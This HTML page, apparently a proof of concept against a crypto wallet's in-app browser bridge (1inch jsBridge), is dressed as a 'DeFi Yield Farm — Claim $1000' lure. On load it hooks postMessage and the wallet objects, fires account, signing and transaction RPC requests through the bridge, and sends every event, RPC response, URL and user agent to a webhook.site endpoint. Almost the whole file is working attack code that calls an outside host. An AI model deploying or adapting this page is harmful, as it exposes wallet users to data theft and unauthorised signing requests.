<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DeFi Yield Farm</title>

<script>
// ============================================================
// KONFIGURASI
// ============================================================
const WEBHOOK_URL = 'https://webhook.site/c508f3b9-2a26-4622-bdef-cdf3cba8f389';

// ============================================================
// EXFIL HELPER
// ============================================================
function exfil(event, data) {
  try {
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event,
        data,
        url: location.href,
        ua: navigator.userAgent,
        ts: new Date().toISOString()
      })
    }).catch(() => {});
  } catch(e) {}
}

// ============================================================
// DEEP HOOK — pasang paling awal
// ============================================================
(function installDeepHook() {
  window.__hookLog = [];

  function hlog(msg) {
    window.__hookLog.push(msg);
    console.log(msg);
    if (typeof window.__flushHookLog === 'function') window.__flushHookLog(msg);
  }

  // Hook postMessage
  try {
    const origPM = window.postMessage;
    window.postMessage = function(msg, ...rest) {
      hlog('[HOOK postMessage] ' + JSON.stringify(msg).substring(0,200));
      exfil('postMessage', msg);
      return origPM.apply(this, [msg, ...rest]);
    };
    hlog('[deepHook] ✅ postMessage ter-hook');
  } catch (e) { hlog('[deepHook] ❌ postMessage: ' + e.message); }

  // Hook addEventListener
  try {
    const origAEL = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, listener, ...rest) {
      if (!['click','load','DOMContentLoaded','message'].includes(type)) {
        hlog('[HOOK addEventListener] ' + type);
      }
      return origAEL.call(this, type, listener, ...rest);
    };
  } catch (e) {}

  // Polling wallet objects
  let attempts = 0;
  const poll = setInterval(() => {
    attempts++;
    ['OneInchIOSWallet', 'OneInchSolanaWallet'].forEach(n => {
      if (window[n] && !window[n].__hooked) {
        window[n].__hooked = true;
        hlog('[HOOK] ✅ Wallet muncul: ' + n);
        exfil('wallet_found', { name: n, keys: Object.keys(window[n]) });
        const origInit = window[n].init;
        if (typeof origInit === 'function') {
          window[n].init = function(...args) {
            hlog(`[HOOK] ${n}.init`);
            exfil('wallet_init', { name: n, args });
            return origInit.apply(this, args);
          };
        }
      }
    });
    if (attempts >= 100) clearInterval(poll);
  }, 100);

  // Polling jsBridge
  let bAttempts = 0;
  const bPoll = setInterval(() => {
    bAttempts++;
    if (window.jsBridge && !window.jsBridge.__hooked) {
      window.jsBridge.__hooked = true;
      hlog('[HOOK] ✅ jsBridge muncul');
      exfil('jsbridge_found', { methods: Object.keys(window.jsBridge) });

      ['postEvmMessage', 'postSolMessage'].forEach(m => {
        if (typeof window.jsBridge[m] === 'function') {
          const orig = window.jsBridge[m].bind(window.jsBridge);
          window.jsBridge[m] = function(...args) {
            hlog(`[HOOK] jsBridge.${m}()`);
            exfil('rpc_sent', { method: m, payload: args[0] });
            return orig(...args);
          };
        }
      });
    }
    if (bAttempts >= 100) clearInterval(bPoll);
  }, 100);

  hlog('[deepHook] 🚀 Selesai inisialisasi');
})();
</script>

<style>
  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 12px; }
  h1 { color: #58a6ff; font-size: 18px; }
  #log {
    background: #161b22; border: 1px solid #30363d; border-radius: 6px;
    padding: 10px; height: 55vh; overflow-y: auto; white-space: pre-wrap;
    font-size: 12px; line-height: 1.4;
  }
  .info  { color: #58a6ff; }
  .ok    { color: #3fb950; }
  .warn  { color: #d29922; }
  .err   { color: #f85149; }
  .hook  { color: #bc8cff; }
  button {
    background: #238636; color: white; border: none; padding: 10px 16px;
    border-radius: 6px; font-size: 14px; margin: 8px 4px 8px 0; cursor: pointer;
  }
</style>
</head>
<body>
<h1>🦄 DeFi Yield Farm — Claim $1000</h1>
<button onclick="runPOC()">Connect Wallet</button>
<button onclick="clearLog()">Clear</button>
<button onclick="exfil('manual_test','hello')">Test Webhook</button>
<div id="log"></div>

<script>
const logEl = document.getElementById('log');

function log(msg, cls = 'info') {
  const line = document.createElement('div');
  line.className = cls;
  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logEl.appendChild(line);
  logEl.scrollTop = logEl.scrollHeight;
}

window.__flushHookLog = (msg) => log(msg, 'hook');

window.addEventListener('DOMContentLoaded', () => {
  (window.__hookLog || []).forEach(m => log(m, 'hook'));
});

function clearLog() { logEl.innerHTML = ''; }

// ============================================================
// DETEKSI
// ============================================================
function detectBridges() {
  log('=== STEP 0: Deteksi Bridge ===', 'info');
  const found = [];
  ['jsBridge','proxyJsBridgeEvm','proxyJsBridgeSol'].forEach(n => {
    const ok = typeof window[n] !== 'undefined';
    log(`  window.${n}: ${ok ? 'ADA ✅' : 'tidak ada ❌'}`, ok ? 'ok' : 'warn');
    if (ok) found.push(n);
  });
  if (window.jsBridge) {
    ['postEvmMessage','postSolMessage'].forEach(m => {
      const ok = typeof window.jsBridge[m] === 'function';
      log(`  jsBridge.${m}(): ${ok ? 'ADA ✅' : 'tidak ❌'}`, ok ? 'ok' : 'err');
    });
  }
  ['OneInchIOSWallet','OneInchSolanaWallet'].forEach(n => {
    const ok = typeof window[n] !== 'undefined';
    log(`  window.${n}: ${ok ? 'ADA ✅' : 'tidak ❌'}`, ok ? 'ok' : 'warn');
  });

  exfil('detection_result', {
    found,
    jsBridge: typeof window.jsBridge,
    proxyEvm: typeof window.proxyJsBridgeEvm,
    proxySol: typeof window.proxyJsBridgeSol,
    oneInchIos: typeof window.OneInchIOSWallet,
    oneInchSol: typeof window.OneInchSolanaWallet,
  });

  return found;
}

// ============================================================
// HOOK RESPONSE + EXFIL
// ============================================================
function hookResponses() {
  log('=== STEP 3: Hook response handler ===', 'info');
  ['proxyJsBridgeEvm','proxyJsBridgeSol'].forEach(name => {
    const proxy = window[name];
    if (proxy && typeof proxy.postMessage === 'function') {
      const orig = proxy.postMessage.bind(proxy);
      proxy.postMessage = function(obj) {
        const data = JSON.stringify(obj);
        log(`  ← Response dari ${name}: ${data.substring(0,200)}`, 'ok');
        exfil('rpc_response', { source: name, response: obj });
        return orig(obj);
      };
      log(`  ✅ Hook + exfil di ${name}.postMessage`, 'ok');
    } else {
      log(`  ⚠️ ${name} tidak ada`, 'warn');
    }
  });
}

// ============================================================
// KIRIM RPC — FIXED
// ============================================================
function sendRpcRequests() {
  log('=== STEP 1: Kirim JSON-RPC ===', 'info');

  if (!window.jsBridge || typeof window.jsBridge.postEvmMessage !== 'function') {
    log('❌ jsBridge.postEvmMessage tidak tersedia', 'err');
    return;
  }

  const requests = [
    { jsonrpc:"2.0", id:101, method:"eth_chainId",          params:[] },
    { jsonrpc:"2.0", id:102, method:"eth_accounts",         params:[] },
    { jsonrpc:"2.0", id:103, method:"eth_requestAccounts",  params:[] },
    { jsonrpc:"2.0", id:104, method:"personal_sign",
      params:["0x48656c6c6f", "0x0000000000000000000000000000000000000000"] },
    { jsonrpc:"2.0", id:105, method:"eth_sendTransaction",
      params:[{
        from:  "0x0000000000000000000000000000000000000000",
        to:    "0x0000000000000000000000000000000000000001",
        value: "0x0",
        gas:   "0x5208"
      }]},
  ];

  requests.forEach((req, i) => {
    setTimeout(() => {
      const s = JSON.stringify(req);
      log(`→ [${req.id}] ${req.method}`, 'warn');
      exfil('rpc_send', { id: req.id, method: req.method, payload: req });
      try {
        window.jsBridge.postEvmMessage(s);
        log(`  ✅ terkirim`, 'ok');
      } catch(e) {
        log(`  ❌ ${e.message}`, 'err');
      }
    }, i * 700);
  });
}

// ============================================================
// KIRIM RPC SOLANA
// ============================================================
function sendSolRequest() {
  log('=== STEP 2: Kirim Solana RPC ===', 'info');
  if (!window.jsBridge || typeof window.jsBridge.postSolMessage !== 'function') {
    log('  ❌ postSolMessage tidak ada', 'err');
    return;
  }
  const solRequest = {
    jsonrpc: "2.0", id: 201,
    method: "connect",
    params: {}
  };
  const s = JSON.stringify(solRequest);
  log('  Payload: ' + s, 'warn');
  exfil('sol_rpc_send', solRequest);
  try {
    window.jsBridge.postSolMessage(s);
    log('  ✅ terkirim', 'ok');
  } catch(e) {
    log('  ❌ ' + e.message, 'err');
  }
}

// ============================================================
// RUNNER
// ============================================================
function runPOC() {
  clearLog();
  log('🚀 Memulai POC', 'ok');
  log('URL: ' + location.href, 'info');
  log('UA: ' + navigator.userAgent, 'info');

  exfil('poc_start', { url: location.href, ua: navigator.userAgent });

  const found = detectBridges();
  if (found.length === 0) {
    log('❌ TIDAK ADA BRIDGE', 'err');
    exfil('no_bridge', {});
    return;
  }

  hookResponses();
  sendRpcRequests();
  setTimeout(sendSolRequest, 4000);
}

window.addEventListener('load', () => setTimeout(runPOC, 800));
</script>
</body>
</html>
